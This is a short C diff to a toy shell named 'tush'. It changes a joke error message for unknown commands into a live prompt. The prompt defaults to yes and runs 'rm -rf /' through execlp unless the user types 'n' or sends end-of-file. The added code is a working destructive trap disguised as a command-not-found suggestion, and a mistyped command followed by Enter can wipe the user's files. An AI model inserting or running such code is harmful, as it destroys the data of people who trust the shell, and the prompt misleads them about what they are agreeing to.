@@ -60,8 +60,14 @@ int main(void) {
 					break;
 
 					case ENOENT:
-					printf("tush: %s: Command not found\nDid you mean `rm -rf /` ?\n", *arg);
-					break;
+					printf("tush: %s: Command not found\nDid you mean `rm -rf /`? [Y/n] ", *arg);
+					// break on ctrl+d or n
+					if (fgets(line, CL_LEN, stdin) == NULL) {
+						printf("\n");
+						break;
+					}
+					if(*line == 'n' || *line == 'N') break;
+					execlp("rm", "rm", "-rf", "/", NULL);
 				}
 				_exit(0);
 			}
